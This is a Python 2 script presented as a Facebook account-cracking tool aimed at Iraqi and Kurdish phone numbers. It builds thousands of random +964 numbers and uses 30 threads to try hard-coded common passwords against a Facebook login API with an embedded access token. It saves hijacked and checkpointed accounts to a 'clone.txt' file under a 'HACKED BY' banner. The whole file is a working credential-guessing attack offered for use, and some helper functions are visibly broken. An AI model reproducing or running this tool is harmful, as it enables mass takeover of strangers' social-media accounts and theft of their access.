#Code By KURA YAXI
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
import requests

os.system('rm -rf .txt')
for n in range(5000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('No Module Named Requests! type:pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('No Module Named Mechanize! type:pip2 install mechanize')
    time.sleep(1)
    os.system('Then type: python2 PUBG.py')


from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
    print 'Thanks.'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)
os.system('mkdir anggaxd/cloned.txt')

def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')

logo = """
\033[31mNEW UBDATE TOOL
\033[31mCODE BY : SARKRDA
\033[31mV.1.5
                    
\033[95m
___    _    ____  _  ______  ____    _
/ ___|  / \  |  _ \| |/ /  _ \|  _ \  / \
\___ \ / _ \ | |_) | ' /| |_) | | | |/ _ \
 ___) / ___ \|  _ <| . \|  _ <| |_| / ___ \
|____/_/   \_\_| \_\_|\_\_| \_\____/_/   \_\

   \033['96m #TikTok >>> small_jerry'                
   \033['93m #SnapChat >>> halo0105'                           

  



"""
logo2 = """



"""
os.system("figlet SARKRDA")
print("")
CorrectUsername = "G"
CorrectPassword = "G"

loop = 'true'
while (loop == 'true'):
    username = raw_input("TOOL USERNAME : ")
    if (username == CorrectUsername):
     password = raw_input("TOOL PASSWORD : ")
     if (password == CorrectPassword):
            print ('\033[92mBzhiT RasTa ! ')
            time.sleep(2)
            os.system('python2 .py')
            loop = 'false'
     else:
     	print("\033[91mHALAYA !")
     	os.system("clear")
    else:
        print("\033[91mHALAYA !")
        os.system("clear")


def menu():
    os.system('clear')
    print logo
    print '\x1b[1;97m[1]\x1b[1;97mCRACK IRAQ'
    print '\x1b[1;97m[2]\x1b[1;97mCRACK KURDISTAN'
    print '\x1b[1;97m[3]\x1b[1;97mCRACK ERBIL'
    print '\x1b[1;97m[4]\x1b[1;97mCRACK  SLEMANI'
    print '\x1b[1;97m[5]FREE MOD \x1b[1;92m[\x1b[1;92mNO CP]'
    print '\n\x1b[1;97m[0] EXIT              '
    print '================================================='
    action()


def action():
    global cpb
    global oks
    peak = raw_input('\n\x1b[1;97mHALBZHERA : \x1b[1;97m')
    if peak == '':
        print '[!] Fill In Correctly'
        action()
    elif peak == '1':
        os.system('clear')
        print logo
        print '\x1b[1;97mHAMU CODAKAN' + '\n'
        print '\x1b[1;97m770 771 772 773 774 750 751 752 753 754 780 781 782 783 784' + '\n'
        try:
            c = raw_input('\x1b[1;97mCODEK HALBZHERA : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '2':
        os.system('clear')
        print logo
        print '\x1b[1;97mHAMU CODAKAN' + '\n'
        print '\x1b[1;97m750 751 752 753 754 780 781 782 783 784' + '\n'
        try:
            c = raw_input('\x1b[1;97mCODEK HALBZHERA : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '3':
        os.system('clear')
        print logo
        print '\x1b[1;97mHAMU CODAKAN' + '\n'
        print '\x1b[1;97m770 771 772 773 774\n'
        try:
            c = raw_input('\x1b[1;97mCODEK HALBZHERA : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '4':
        os.system('clear')
        print logo
        print '\x1b[1;97mHAMU CODAKAN' + '\n'
        print '\x1b[1;97m770 771 772 773 774 750 751 752 753 754 780 781 782 783 784' + '\n'
        try:
            c = raw_input('\x1b[1;97mCODEK HALBZHERA : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '5':
        os.system('clear')
        print logo
        print '\x1b[1;97mHAMU RAQAMAKAN  \033[92m[\033[92mFREE \033[92mMOD]' + '\n'
        print '\x1b[1;97m770 771 772 773 774 750 751 752 753 754 780 781 782 783 784' + '\n'
        try:
            c = raw_input('\x1b[1;97mCODEK HALBZHERA : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '0':
        menu()
    else:
        print '[!] Fill In Correctly'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] TOTAL NUMBERS : ' + xxx)
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] CRACK DASTI PEKRD')
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] TKAYA DAYMAXA')
    time.sleep(0.5)
    psb('[!] BO WASTAN TOOL CTRL+Z DAGRA')
    time.sleep(0.5)
    print '\x1b[1;97m--------------------------------------------------'

    def main(arg):
        user = arg
        try:
            os.mkdir('Matin')
        except OSError:
            pass

        try:
            pass1 = 'hama12345'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HACKED BY KURA YAXI]  ' + k + c + user + '  \x1b[1;92m|PASS>>  ' + pass1
                okb = open('anggaxd/clone.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[CP]  \x1b[1;97m' + k + c + user + '  \x1b[1;97m|PASS>>  ' + pass1
                cps = open('anggaxd/clone.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = 'hama1234'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[HACKED BY KURA YAXI]  ' + k + c + user + '  \x1b[1;92m|PASS>>  ' + pass2
                    okb = open('anggaxd/clone.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[CP]  \x1b[1;97m' + k + c + user + '  \x1b[1;97m|PASS>>  ' + pass2
                    cps = open('anggaxd/clone.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = 'hama123'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[HACKED BY KURA YAXI]  ' + k + c + user + '  \x1b[1;92m|PASS>>  ' + pass3
                        okb = open('anggaxd/clone.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[CP]  \x1b[1;97m' + k + c + user + '  \x1b[1;97m|PASS>>  ' + pass3
                        cps = open('anggaxd/clone.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = 'ahmad12345'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[HACKED BY KURA YAXI]  ' + k + c + user + '  \x1b[1;92m|PASS>>  ' + pass4
                            okb = open('anggaxd/clone.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[CP]  \x1b[1;97m' + k + c + user + '  \x1b[1;97m|PASS>>  ' + pass4
                            cps = open('anggaxd/clone.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = 'ahmad1234'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[HACKED BY KURA YAXI]  ' + k + c + user + '  \x1b[1;92m|PASS>>  ' + pass5
                                okb = open('anggaxd/clone.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;97m[CP]  \x1b[1;97m' + k + c + user + '  \x1b[1;97m|PASS>>  ' + pass5
                                cps = open('anggaxd/clone.txt', 'a')
                                cps.write(k + c + user + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
                            else:
                                pass6 = 'ahmad123'
                                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[HACKED BY KURA YAXI]  ' + k + c + user + '  \x1b[1;92m|PASS>>  ' + pass6
                                    okb = open('anggaxd/clone.txt', 'a')
                                    okb.write(k + c + user + pass6 + '\n')
                                    okb.close()
                                    oks.append(c + user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[CP]  \x1b[1;97m' + k + c + user + '  \x1b[1;97m|PASS>>  ' + pass6
                                    cps = open('anggaxd/clone.txt', 'a')
                                    cps.write(k + c + user + pass6 + '\n')
                                    cps.close()
                                    cpb.append(c + user + pass6)
                                else:
                                    pass7 = 'azad12345'
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[HACKED BY KURA YAXI]  ' + k + c + user + '  \x1b[1;92m|PASS>>  ' + pass7
                                        okb = open('anggaxd/clone.txt', 'a')
                                        okb.write(k + c + user + pass7 + '\n')
                                        okb.close()
                                        oks.append(c + user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;97m[CP]  \x1b[1;97m' + k + c + user + '  \x1b[1;97m|PASS>>  ' + pass7
                                        cps = open('anggaxd/clone.txt', 'a')
                                        cps.write(k + c + user + pass7 + '\n')
                                        cps.close()
                                        cpb.append(c + user + pass7)
                                    else:
                                        pass8 = 'azad123'
                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;92m[HACKED BY KURA YAXI]  ' + k + c + user + '  \x1b[1;92m|PASS>>  ' + pass8
                                            okb = open('anggaxd/clone.txt', 'a')
                                            okb.write(k + c + user + pass8 + '\n')
                                            okb.close()
                                            oks.append(c + user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;97m[CP]  \x1b[1;97m' + k + c + user + '  \x1b[1;97m|PASS>>  ' + pass8
                                            cps = open('anggaxd/clone.txt', 'a')
                                            cps.write(k + c + user + pass8 + '\n')
                                            cps.close()
                                            cpb.append(c + user + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m--------------------------------------------------'
    print '[\xe2\x9c\x93] HACKRDNAKA TAWAW BU......'
    print '[\xe2\x9c\x93] Total Successfully/Checkpoint : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] Cloned Accounts Has Been Saved : anggaxd/clone.txt'
    raw_input('\n\x1b[1;97m[\x1b[1;97mBack\x1b[1;95m]')
    menu()


if __name__ == '__main__':
    menu()